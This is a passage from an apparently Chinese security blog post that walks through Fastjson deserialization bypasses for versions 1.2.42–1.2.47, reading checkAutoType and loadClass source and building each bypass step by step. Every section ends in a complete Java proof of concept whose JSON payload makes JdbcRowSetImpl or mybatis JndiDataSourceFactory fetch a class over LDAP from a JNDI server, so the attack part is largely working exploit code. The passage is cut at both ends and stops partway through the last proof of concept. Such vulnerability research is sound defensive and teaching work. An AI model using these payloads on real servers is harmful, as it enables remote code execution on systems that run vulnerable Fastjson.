Array.newInstance(componentType, 0).getClass();    &#125; else if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) &#123;        String newClassName = className.substring(1, className.length() - 1);        return loadClass(newClassName, classLoader);</code></pre><p>还是和上一个版本的一样，遇到<code>L</code>开头<code>;</code>结尾的就进行去头去尾得到新的newClassName</p><pre><code>Lcom.sun.rowset.JdbcRowSetImpl;</code></pre><p>然后将这个newClassName再传到<code>loadClass(newClassName, classLoader)</code></p><p>也就是这个方法本身，这里类似递归</p><p>还是相同的逻辑进行去头去尾，然后获得到新的newClassName</p><pre><code class="Lcom.sun.rowset.JdbcRowSetImpl">com.sun.rowset.JdbcRowSetImpl</code></pre><p>然后再走到这个loadClass，这次不会进入这些else if分支了</p><p>直接走的是最后的else分支</p><pre><code class="java">try &#123;         ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();         if (contextClassLoader != null &amp;&amp; contextClassLoader != classLoader) &#123;             clazz = contextClassLoader.loadClass(className);              if (cache) &#123;                mappings.put(className, clazz);                &#125;              return clazz;            &#125;         &#125; catch (Throwable var6) &#123;     &#125;</code></pre><p>首先是获取加载器contextClassLoader，加载器满足if的条件的条件进入if语句，然后加载<code>com.sun.rowset.JdbcRowSetImpl</code>并返回</p><p>整个恶意类加载的过程大概就是酱紫了，完整的POC:</p><pre><code class="java">package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.ParserConfig;public class App&#123;    public static void main( String[] args ) &#123;        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);          String payload=&quot;&#123;\&quot;@type\&quot;:\&quot;LLcom.sun.rowset.JdbcRowSetImpl;;\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;,\&quot;AutoCommit\&quot;:true&#125;&quot;;        JSON.parseObject(payload);    &#125;&#125;</code></pre><h2 id="Fastjson1-2-25-1-2-43"><a href="#Fastjson1-2-25-1-2-43" class="headerlink" title="Fastjson1.2.25-1.2.43"></a>Fastjson1.2.25-1.2.43</h2><p>条件：开启AutoType</p><p>环境搭建</p><pre><code class="xml">&lt;dependency&gt;      &lt;groupId&gt;com.alibaba&lt;/groupId&gt;      &lt;artifactId&gt;fastjson&lt;/artifactId&gt;      &lt;version&gt;1.2.43&lt;/version&gt;    &lt;/dependency&gt;</code></pre><p>在1.2.43版本中针对1.2.42的绕过方式进行了修复，修复的地方还是在<code>checkAutoType()</code>方法</p><p>1.2.42版本</p><pre><code class="java">public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;        if (typeName == null) &#123;            return null;        &#125; else if (typeName.length() &lt; 128 &amp;&amp; typeName.length() &gt;= 3) &#123;            String className = typeName.replace(&#39;$&#39;, &#39;.&#39;);            Class&lt;?&gt; clazz = null;            long BASIC = -3750763034362895579L;            long PRIME = 1099511628211L;            if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) &#123;                className = className.substring(1, className.length() - 1);            &#125;</code></pre><p>1.2.43版本</p><pre><code class="java">public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;        if (typeName == null) &#123;            return null;        &#125; else if (typeName.length() &lt; 128 &amp;&amp; typeName.length() &gt;= 3) &#123;            String className = typeName.replace(&#39;$&#39;, &#39;.&#39;);            Class&lt;?&gt; clazz = null;            long BASIC = -3750763034362895579L;            long PRIME = 1099511628211L;            if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) &#123;                if (((-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L ^ (long)className.charAt(1)) * 1099511628211L == 655656408941810501L) &#123;                    throw new JSONException(&quot;autoType is not support. &quot; + typeName);                &#125;                className = className.substring(1, className.length() - 1);            &#125;</code></pre><p>对比可以看到，在第一次去除L开头和<code>;</code>结尾的步骤中，1.2.43版本还进行多一次检测，如果“去头去尾”后还检测到L开头和<code>;</code>结尾，那就直接报出错误，<code>autoType is not support. Lxxxxxxxx;</code></p><p>主要的变化就这样，后面的逻辑和之前的一样</p><h3 id="绕过分析-2"><a href="#绕过分析-2" class="headerlink" title="绕过分析"></a>绕过分析</h3><p>走<code>L+;</code>这条路似乎是不行了，再看看loadClass()</p><pre><code class="java">public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) &#123;    if (className != null &amp;&amp; className.length() != 0) &#123;        Class&lt;?&gt; clazz = (Class)mappings.get(className);        if (clazz != null) &#123;            return clazz;        &#125; else if (className.charAt(0) == &#39;[&#39;) &#123;            Class&lt;?&gt; componentType = loadClass(className.substring(1), classLoader);            return Array.newInstance(componentType, 0).getClass();        &#125; else if (className.startsWith(&quot;L&quot;) &amp;&amp; className.endsWith(&quot;;&quot;)) &#123;            String newClassName = className.substring(1, className.length() - 1);            return loadClass(newClassName, classLoader);</code></pre><p><code>L+;</code>这条路走不了，可以试试<code>[</code>这条路，但是在1.2.41的时候就知道它是会报错的</p><p>比如</p><pre><code>String payload=&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;,\&quot;dataSourceName\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;,\&quot;AutoCommit\&quot;:true&#125;&quot;;</code></pre><p>出现报错</p><pre><code>Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: exepct &#39;[&#39;, but ,, pos 42, json : &#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://0.0.0.0:1389/Basic/Command/calc&quot;,&quot;AutoCommit&quot;:true&#125;翻译：线程中的异常 &quot;main&quot; com.alibaba.fastjson.JSONException: 期望 &#39;[&#39;, 但是得到了 ,, 位置 42, JSON 数据 : &#123;&quot;@type&quot;:&quot;[com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://0.0.0.0:1389/Basic/Command/calc&quot;,&quot;AutoCommit&quot;:true&#125;</code></pre><p>大概就是说逗号<code>,</code>的这个位置，程序期望得到的是’[‘ ， 那就按要求改</p><pre><code>String payload=&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[,\&quot;dataSourceName\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;,\&quot;AutoCommit\&quot;:true&#125;&quot;;</code></pre><p>然后还继续报错</p><pre><code class="tex">Exception in thread &quot;main&quot; com.alibaba.fastjson.JSONException: syntax error, expect &#123;, actual string, pos 43, fastjson-version 1.2.43翻译线程中的异常 &quot;main&quot; com.alibaba.fastjson.JSONException: 语法错误，期望 &#123;，实际为字符串，位置 43，fastjson 版本 1.2.43</code></pre><p>就是说这个<code>[</code>号的后面应该加一个<code>&#123; </code> ,那就加上</p><pre><code>String payload=&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;,\&quot;AutoCommit\&quot;:true&#125;&quot;;</code></pre><p>然后就成功加载了这个类，进行了JNDI注入</p><p>额~，这似乎有点意外</p><p>调试分析</p><p>因为ClassName &#x3D; [com.sun.rowset.JdbcRowSetImpl 肯定能够绕过黑名单，进入loadClass,返回Array.newInstance(componentType, 0).getClass();</p><p>经过了<code>checkAutoType</code>的打磨后，得到的clazz如下</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230808145519743.png" alt="image-20230808145519743"></p><p>往下进入了nextToken()</p><pre><code class="java">if (clazz != null) &#123;    lexer.nextToken(16);</code></pre><p>因为<code>&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;</code>检测到了第二个<code>[</code>,修改了原来的token值，原来的值是4，修改为了 14</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230808145755081.png" alt="image-20230808145755081"></p><p>返回继续往下，这里是获取到一个和数组有关的反序列化器进行反序列化</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230808150052682.png" alt="image-20230808150052682"></p><p>跟进deserialze</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230808150537793.png" alt="image-20230808150537793"></p><p>这里利用了<code>getComponentType()</code>去解析这个类名，获取到了com.sun.rowset.JdbcRowSetImpl  </p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230808151129461.png" alt="image-20230808151129461"></p><p>然后就是进入parseArray进行解析，跟进查看</p><pre><code class="java">if (token != 14) &#123;    throw new JSONException(&quot;exepct &#39;[&#39;, but &quot; + JSONToken.name(token) + &quot;, &quot; + this.lexer.info());&#125; </code></pre><p>之前报错是因为token！&#x3D;14，限制token&#x3D;&#x3D;14就不报错了</p><p>往下来到这个if语句，进入了else语句进行反序列化</p><pre><code class="java">if (this.lexer.token() == 8) &#123;    this.lexer.nextToken();    val = null;&#125; else &#123;    val = ((ObjectDeserializer)deserializer).deserialze(this, type, i);&#125;</code></pre><p>这里进行反序列化使用的类是<code>JavaBeanDeserializer</code></p><p>反序列化后就成功弹出计算器了</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230808152146544.png" alt="image-20230808152146544"></p><p>最后的POC</p><pre><code class="java">package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.ParserConfig;public class App&#123;    public static void main( String[] args ) &#123;        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);        String payload=&quot;&#123;\&quot;@type\&quot;:\&quot;[com.sun.rowset.JdbcRowSetImpl\&quot;[&#123;,\&quot;dataSourceName\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;,\&quot;AutoCommit\&quot;:true&#125;&quot;;        JSON.parseObject(payload);    &#125;&#125;</code></pre><h2 id="Fastjson1-2-25-1-2-45"><a href="#Fastjson1-2-25-1-2-45" class="headerlink" title="Fastjson1.2.25-1.2.45"></a>Fastjson1.2.25-1.2.45</h2><p>条件：开启AutoType，并且mybatis&lt;3.5</p><p>环境搭建</p><pre><code class="xml">&lt;dependency&gt;      &lt;groupId&gt;com.alibaba&lt;/groupId&gt;      &lt;artifactId&gt;fastjson&lt;/artifactId&gt;      &lt;version&gt;1.2.45&lt;/version&gt;    &lt;/dependency&gt;    &lt;dependency&gt;      &lt;groupId&gt;org.mybatis&lt;/groupId&gt;      &lt;artifactId&gt;mybatis&lt;/artifactId&gt;      &lt;version&gt;3.4.6&lt;/version&gt;    &lt;/dependency&gt;</code></pre><p>在1.2.44版本的修复中，修复了<code>[</code>绕过的漏洞</p><pre><code class="java">public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;    if (typeName == null) &#123;        return null;    &#125; else if (typeName.length() &lt; 128 &amp;&amp; typeName.length() &gt;= 3) &#123;        String className = typeName.replace(&#39;$&#39;, &#39;.&#39;);        Class&lt;?&gt; clazz = null;        long BASIC = -3750763034362895579L;        long PRIME = 1099511628211L;        long h1 = (-3750763034362895579L ^ (long)className.charAt(0)) * 1099511628211L;        if (h1 == -5808493101479473382L) &#123;            throw new JSONException(&quot;autoType is not support. &quot; + typeName);        &#125; else if ((h1 ^ (long)className.charAt(className.length() - 1)) * 1099511628211L == 655701488918567152L) &#123;            throw new JSONException(&quot;autoType is not support. &quot; + typeName);       </code></pre><p>可以看到，这里先处理了<code>[</code>开头的类名，如果是这里符号开头的话，直接报错</p><p>然后再检测开头和结尾，如果是<code>L</code>  开头<code>;</code>结尾的，也直接报错</p><h3 id="绕过分析-3"><a href="#绕过分析-3" class="headerlink" title="绕过分析"></a>绕过分析</h3><p>loadClass的两条路直接被堵死，这能和黑名单硬刚了，找一个黑名单里面没有的，可利用的类</p><p>因为黑名单都是hashcode，需要参考<a href="https://github.com/LeadroyaL/fastjson-blacklist">https://github.com/LeadroyaL/fastjson-blacklist</a> 这个项目，里面是作者找出的fastjson中hashcode对应的类</p><p>这个版本利用的是<code>org.apache.ibatis.datasource.jndi.JndiDataSourceFactory</code>这个类，这个类不在黑名单里面，可过检测</p><p>这里使用的是setProperties这个方法，参数是Properties类型的继承自Hashtable</p><pre><code class="java">public void setProperties(Properties properties) &#123;    try &#123;        Properties env = getEnvProperties(properties);        InitialContext initCtx;        if (env == null) &#123;            initCtx = new InitialContext();        &#125; else &#123;            initCtx = new InitialContext(env);        &#125;        if (properties.containsKey(&quot;initial_context&quot;) &amp;&amp; properties.containsKey(&quot;data_source&quot;)) &#123;            Context ctx = (Context)initCtx.lookup(properties.getProperty(&quot;initial_context&quot;));            this.dataSource = (DataSource)ctx.lookup(properties.getProperty(&quot;data_source&quot;));        &#125; else if (properties.containsKey(&quot;data_source&quot;)) &#123;            this.dataSource = (DataSource)initCtx.lookup(properties.getProperty(&quot;data_source&quot;));        &#125;    &#125; catch (NamingException var5) &#123;        throw new DataSourceException(&quot;There was an error configuring JndiDataSourceTransactionPool. Cause: &quot; + var5, var5);    &#125;&#125;</code></pre><p>这个方法可以在反序列化自动调用</p><pre><code class="java">//Hashtablepublic synchronized boolean containsKey(Object key) &#123;    Entry&lt;?,?&gt; tab[] = table;    int hash = key.hashCode();    int index = (hash &amp; 0x7FFFFFFF) % tab.length;    for (Entry&lt;?,?&gt; e = tab[index] ; e != null ; e = e.next) &#123;        if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;            return true;        &#125;    &#125;    return false;&#125;</code></pre><p><code>properties.containsKey(&quot;initial_context&quot;) 和 properties.containsKey(&quot;data_source&quot;)</code>这里的意思是检测这个<code>properties</code>是否存在initial_context或者data_source</p><p>如果两个都存在，则会进入第一个if语句，如果只存在<code>data_source</code>, 则进入else分支</p><p>进入if 语句后，就能够调用<code>lookup</code>进行JNDI注入了</p><p>查看<code>properties.getProperty(&quot;data_source&quot;)</code>是否可控</p><pre><code class="java">public String getProperty(String key) &#123;    Object oval = super.get(key);    String sval = (oval instanceof String) ? (String)oval : null;    return ((sval == null) &amp;&amp; (defaults != null)) ? defaults.getProperty(key) : sval;&#125;</code></pre><p>首先从父类Hashtable获取<code>key</code>对应的值，保存到oval，再判断这个oval是否是String类型的实例，如果是进行类型转换，如果不上则sval赋值为null</p><p>如果((sval &#x3D;&#x3D; null) &amp;&amp; (defaults !&#x3D; null))&#x3D;&#x3D;true 则返回defaults.getProperty(key)，否则返回sval</p><p>所以只有能够控制键值对中<code>initial_context</code>或者<code>data_source</code>的对应的值就能够利用lookup进行JNDI注入</p><p>下一步就是如何传入参数</p><pre><code class="java">public void setProperties(Properties properties)</code></pre><p>已经知道这个setter方法可以自动调用了，这个参数是键值对,那就传入 一个键值对</p><pre><code class="java">String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;&#125;&#125;&quot;;</code></pre><p>或者</p><pre><code class="java">String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;aaa\&quot;,\&quot;initial_context\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;&#125;&#125;&quot;;</code></pre><p>这个需要开启AutoType，如果不开启，在checkAutoType里面无法返回已经加载的这个类</p><p>最终POC</p><pre><code class="java">package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.ParserConfig;import org.apache.ibatis.datasource.jndi.JndiDataSourceFactory;public class App&#123;    public static void main( String[] args ) &#123;        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;&#125;&#125;&quot;;        //        String payload = &quot;&#123;\&quot;@type\&quot;:\&quot;org.apache.ibatis.datasource.jndi.JndiDataSourceFactory\&quot;,\&quot;properties\&quot;:&#123;\&quot;data_source\&quot;:\&quot;aaa\&quot;,\&quot;initial_context\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;&#125;&#125;&quot;;        JSON.parseObject(payload);    &#125;&#125;</code></pre><h2 id="Fastjson1-2-25-1-2-47"><a href="#Fastjson1-2-25-1-2-47" class="headerlink" title="Fastjson1.2.25-1.2.47"></a>Fastjson1.2.25-1.2.47</h2><p>环境搭建</p><pre><code class="xml">&lt;dependency&gt;  &lt;groupId&gt;com.alibaba&lt;/groupId&gt;  &lt;artifactId&gt;fastjson&lt;/artifactId&gt;  &lt;version&gt;1.2.47&lt;/version&gt;&lt;/dependency&gt;</code></pre><p>在这个版本中，为了修复 上个版本的漏洞，将<code>org.apache.ibatis.datasource</code>添加到了黑名单</p><p><img src="https://raw.githubusercontent.com/todis21/image/main/image-20230808210641210.png" alt="image-20230808210641210"></p><h3 id="绕过分析-4"><a href="#绕过分析-4" class="headerlink" title="绕过分析"></a>绕过分析</h3><p>如果找不到一个不存在于黑名单的可利用类，只能在处理过程寻找漏洞，绕过黑白名单检测</p><p>因为阻挡我们利用的地方主要是<code>checkAutoType</code>这个方法，所以需要重新审计一下</p><pre><code class="java">public Class&lt;?&gt; checkAutoType(String typeName, Class&lt;?&gt; expectClass, int features) &#123;    if (typeName == null) &#123;        return null;    &#125;    if (typeName.length() &gt;= 128 || typeName.length() &lt; 3) &#123;        throw new JSONException(&quot;autoType is not support. &quot; + typeName);    &#125;    String className = typeName.replace(&#39;$&#39;, &#39;.&#39;);    Class&lt;?&gt; clazz = null;</code></pre><p>首先这个方法的开头，是对typeName进行一些简单的检测可处理，检测typeName是否为空，检测typeName长度，然后将<code>$</code>替换为<code>.</code></p><p>往下：</p><pre><code class="java">final long h1 = (BASIC ^ className.charAt(0)) * PRIME;if (h1 == 0xaf64164c86024f1aL) &#123; // [    throw new JSONException(&quot;autoType is not support. &quot; + typeName);&#125;if ((h1 ^ className.charAt(className.length() - 1)) * PRIME == 0x9198507b5af98f0L) &#123;    throw new JSONException(&quot;autoType is not support. &quot; + typeName);&#125;final long h3 = (((((BASIC ^ className.charAt(0))        * PRIME)        ^ className.charAt(1))        * PRIME)        ^ className.charAt(2))        * PRIME;</code></pre><p>这里就是对1.2.43之前的两个绕过方式进行检测，这里无法绕过了，继续往下看</p><pre><code class="java">if (autoTypeSupport || expectClass != null) &#123;    long hash = h3;    for (int i = 3; i &lt; className.length(); ++i) &#123;        hash ^= className.charAt(i);        hash *= PRIME;        if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) &#123;            clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);            if (clazz != null) &#123;                return clazz;            &#125;        &#125;        if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0 &amp;&amp; TypeUtils.getClassFromMapping(typeName) == null) &#123;            throw new JSONException(&quot;autoType is not support. &quot; + typeName);        &#125;    &#125;&#125;</code></pre><p>如果开启了<code>autoType</code>,就会进入这个if语句，先进行白名单检测，如果这个类再白名单里面，直接加载并返回，如果找不到，就去黑名单里面找，还找不到就继续往下</p><pre><code class="java">if (clazz == null) &#123;    clazz = TypeUtils.getClassFromMapping(typeName);&#125;if (clazz == null) &#123;    clazz = deserializers.findClass(typeName);&#125;if (clazz != null) &#123;    if (expectClass != null            &amp;&amp; clazz != java.util.HashMap.class            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());    &#125;    return clazz;&#125;</code></pre><p>这一段就是当<code>autoType</code>未开启或者<code>autoType</code>开启后在黑白名单中都找不到的时候 ，尝试通过<code>TypeUtils.getClassFromMapping</code>或者<code>deserializers.findClass</code>来获取类，如果能够找到，进入第三个if语句，这里存在第二个<code>return clazz</code>,但是要确保不会进入里面的if语句</p><p>继续往下：</p><pre><code class="java">if (!autoTypeSupport) &#123;    long hash = h3;    for (int i = 3; i &lt; className.length(); ++i) &#123;        char c = className.charAt(i);        hash ^= c;        hash *= PRIME;        if (Arrays.binarySearch(denyHashCodes, hash) &gt;= 0) &#123;            throw new JSONException(&quot;autoType is not support. &quot; + typeName);        &#125;        if (Arrays.binarySearch(acceptHashCodes, hash) &gt;= 0) &#123;            if (clazz == null) &#123;                clazz = TypeUtils.loadClass(typeName, defaultClassLoader, false);            &#125;            if (expectClass != null &amp;&amp; expectClass.isAssignableFrom(clazz)) &#123;                throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());            &#125;            return clazz;        &#125;    &#125;&#125;</code></pre><p>这里是没有开启<code>autoType</code>的处理，首先进行一波黑名单过滤，再进行白名单检查，如果存在于白名单中那就会出现第三个<code>return clazz</code></p><p>后面的已经不重要了，因为已经经过黑白名单了，如果还想往后面走，只能找到一个新的利用类</p><p>经过前面的分析发现，无论是否开启<code>autoType</code>,都会经过黑白名单检查，但是在未开启<code>autoType</code>的时候，在进入<code>if (!autoTypeSupport)</code>之前是存在一个<code>return clazz</code>的，也就是第二个<code>return clazz</code>,</p><p>autoType开启的情况下如果<code>TypeUtils.getClassFromMapping(typeName) != null</code>，也可以跳过黑名单检查进入第二个<code>return clazz</code></p><pre><code class="java">if (clazz == null) &#123;    clazz = TypeUtils.getClassFromMapping(typeName);&#125;if (clazz == null) &#123;    clazz = deserializers.findClass(typeName);&#125;if (clazz != null) &#123;    if (expectClass != null            &amp;&amp; clazz != java.util.HashMap.class            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());    &#125;    return clazz;&#125;</code></pre><p>如果能在进入黑白名单检查之前就返回出去，那就不需要经过后面的黑白名单检查了</p><p>要实现这个，首先要实现在<code>TypeUtils.getClassFromMapping(typeName)</code>或者<code>deserializers.findClass(typeName);</code>得到clazz</p><p>还要不进入</p><pre><code class="java">if (expectClass != null            &amp;&amp; clazz != java.util.HashMap.class            &amp;&amp; !expectClass.isAssignableFrom(clazz)) &#123;        throw new JSONException(&quot;type not match. &quot; + typeName + &quot; -&gt; &quot; + expectClass.getName());    &#125;</code></pre><p>先看看<code>TypeUtils.getClassFromMapping(typeName)</code></p><pre><code class="java">private static ConcurrentMap&lt;String,Class&lt;?&gt;&gt; mappings = new ConcurrentHashMap&lt;String,Class&lt;?&gt;&gt;(16, 0.75f, 1);public static Class&lt;?&gt; getClassFromMapping(String className)&#123;    return mappings.get(className);&#125;</code></pre><p>这个是从<code>mappings</code>获取这个类，是一个MAP对象，那就寻找<code>mappings.put()</code>的地方，看看哪里可以将我们需要的类存进mappings里面</p><p>然后找到能利用的只有loadClass这个地方</p><pre><code class="java">public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader, boolean cache) &#123;    .....    try&#123;        if(classLoader != null)&#123;            clazz = classLoader.loadClass(className);            if (cache) &#123;                mappings.put(className, clazz);//------&gt;看这里            &#125;            return clazz;        &#125;    &#125; catch(Throwable e)&#123;        e.printStackTrace();        // skip    &#125;    try&#123;        ClassLoader contextClassLoader = Thread.currentThread().getContextClassLoader();        if(contextClassLoader != null &amp;&amp; contextClassLoader != classLoader)&#123;            clazz = contextClassLoader.loadClass(className);            if (cache) &#123;                mappings.put(className, clazz);//------&gt;看这里            &#125;            return clazz;        &#125;    &#125; catch(Throwable e)&#123;        // skip    &#125;    try&#123;        clazz = Class.forName(className);        mappings.put(className, clazz);//------&gt;看这里        return clazz;      &#125; catch(Throwable e)&#123;        // skip    &#125;    return clazz;&#125;</code></pre><p>可以发现如果可以控制输入参数，是可以往这个mappings中写入任意类名的（从而绕过autocheck的黑白名单）</p><p>下一步就是寻找哪里调用了<code>loadClass(String className, ClassLoader classLoader, boolean cache)</code></p><p>找到几个，其中有是在<code>checkAutoType</code>里面的，可直接Pass,剩下的就是</p><pre><code class="java">public static Class&lt;?&gt; loadClass(String className, ClassLoader classLoader) &#123;        return loadClass(className, classLoader, true);    &#125;</code></pre><p>再寻找哪里调用了<code>loadClass(String className, ClassLoader classLoader)</code></p><p>然后找到<code>com/alibaba/fastjson/serializer/MiscCodec.java#deserialze(DefaultJSONParser parser, Type clazz, Object fieldName):335</code></p><pre><code class="java">if (clazz == Class.class) &#123;            return (T) TypeUtils.loadClass(strVal, parser.getConfig().getDefaultClassLoader());        &#125;</code></pre><p>这个方法的代码很长，需要一步一步往上分析</p><p>要运行到此处并且控制参数<code>strVal</code>为恶意类名，需要保证<code>clazz == Class.class</code>,这个clazz来自方法参数<code>deserialze(DefaultJSONParser parser, Type clazz, Object fieldName)</code></p><p>然后往上查看<code>strVal</code>的来源</p><pre><code class="java">String strVal;if (objVal == null) &#123;    strVal = null;&#125; else if (objVal instanceof String) &#123;    strVal = (String) objVal;&#125; else &#123;    ......&#125;</code></pre><p>很明显的看到这个<code>strVal</code>的值来自<code>objVal</code> </p><p>继续往上寻找<code>objVal</code>的来源</p><pre><code class="java">Object objVal;if (parser.resolveStatus == DefaultJSONParser.TypeNameRedirect) &#123;    parser.resolveStatus = DefaultJSONParser.NONE;    parser.accept(JSONToken.COMMA);    if (lexer.token() == JSONToken.LITERAL_STRING) &#123;        if (!&quot;val&quot;.equals(lexer.stringVal())) &#123;            throw new JSONException(&quot;syntax error&quot;);        &#125;        lexer.nextToken();    &#125; else &#123;        throw new JSONException(&quot;syntax error&quot;);    &#125;    parser.accept(JSONToken.COLON);    objVal = parser.parse();    parser.accept(JSONToken.RBRACE);&#125; else &#123;    objVal = parser.parse();&#125;</code></pre><p>这段代码中判断<code>parser.resolveStatus == DefaultJSONParser.TypeNameRedirect</code>,如果为false，直接 <code>objVal = parser.parse();</code></p><p>如果为true，进入if语句，使用lexer判断当前的 token 是否为 JSONToken.LITERAL_STRING（字符串类型的值）如果是，再判断是否为”val“,不是则报错 </p><p><code>parser.accept(JSONToken.COLON);</code>中的<code>JSONToken.COLON</code>是冒号<code>:</code> ，<code>JSONToken.RBRACE</code>是右大括号；</p><pre><code class="java">parser.accept(JSONToken.COLON);    objVal = parser.parse();    parser.accept(JSONToken.RBRACE);</code></pre><p>这段大概的意思是将json字符串中val对应的值赋给objVal，例如{“val”:”xxx”} 中的xxx ,这里可以控制为我们需要的恶意类名<strong>“val”:”恶意类名”</strong></p><p>根据前面的分析还需要<code>clazz == Class.class</code>  ,这个clazz可以为<code>java.lang.Class</code></p><p>下一步就是寻找哪里调用了这个<code>deserialze(DefaultJSONParser parser, Type clazz, Object fieldName)</code></p><p>查看引用处其实可以发现这是一个非常多地方会调用到的常用函数，就比如json解析过程中的<code>com.alibaba.fastjson.parser.DefaultJSONParser#parseObject(java.util.Map, java.lang.Object)</code></p><p>需要进入<code>@type</code>的那层if判断，在这个if语句的最后：</p><pre><code class="java">Object obj = deserializer.deserialze(this, clazz, fieldName);</code></pre><p>分析到这里，假如利用的恶意类为<code>com.sun.rowset.JdbcRowSetImpl</code>  ,   初步的POC如下</p><pre><code class="json">&#123;&quot;@type&quot;:&quot;java.lang.Class&quot;,&quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;</code></pre><p>经过调试发现<code>com.sun.rowset.JdbcRowSetImpl</code>已经put到了<code>mappings</code>中了</p><p>现在只是将恶意类的类名加入了<code>mappings</code>里面还需要进一步的利用</p><p>com.sun.rowset.JdbcRowSetImpl的利用如下：</p><pre><code class="json">&#123;&quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,&quot;dataSourceName&quot;:&quot;ldap://0.0.0.0:1389/Basic/Command/calc&quot;,&quot;AutoCommit&quot;:true&#125;</code></pre><p>两者结合一下</p><pre><code class="json">&#123;    &quot;a&quot;:&#123;        &quot;@type&quot;:&quot;java.lang.Class&quot;,        &quot;val&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;&#125;,    &quot;b&quot;:&#123;        &quot;@type&quot;:&quot;com.sun.rowset.JdbcRowSetImpl&quot;,        &quot;dataSourceName&quot;:&quot;ldap://0.0.0.0:1389/Basic/Command/calc&quot;,        &quot;AutoCommit&quot;:true    &#125;&#125;</code></pre><p>这个POC可开启<code>autoType</code>,因为开启autoType后，第一次进入checkAutoType(),class是<code>java.lang.Class</code>,不在黑白名单中，不会被拦截</p><p>第一次进入checkAutoType(), class是<code>com.sun.rowset.JdbcRowSetImpl</code>  ，因为TypeUtils.getClassFromMapping(typeName) ！&#x3D; null</p><p>不会进行黑名单检查</p><p>如果不开启<code>autoType</code> ,还没有进行黑白名单检查就已经return calzz了</p><p>最终POC:</p><pre><code class="java">package org.example;import com.alibaba.fastjson.JSON;import com.alibaba.fastjson.parser.ParserConfig;public class App&#123;    public static void main( String[] args ) &#123;//        ParserConfig.getGlobalInstance().setAutoTypeSupport(true);        String payload = &quot;&#123;\n&quot; +                &quot;    \&quot;a\&quot;:&#123;\n&quot; +                &quot;        \&quot;@type\&quot;:\&quot;java.lang.Class\&quot;,\n&quot; +                &quot;        \&quot;val\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;&#125;,\n&quot; +                &quot;    \&quot;b\&quot;:&#123;\n&quot; +                &quot;        \&quot;@type\&quot;:\&quot;com.sun.rowset.JdbcRowSetImpl\&quot;,\n&quot; +                &quot;        \&quot;dataSourceName\&quot;:\&quot;ldap://0.0.0.0:1389/Basic/Command/calc\&quot;,\n&quot; +                &quot;        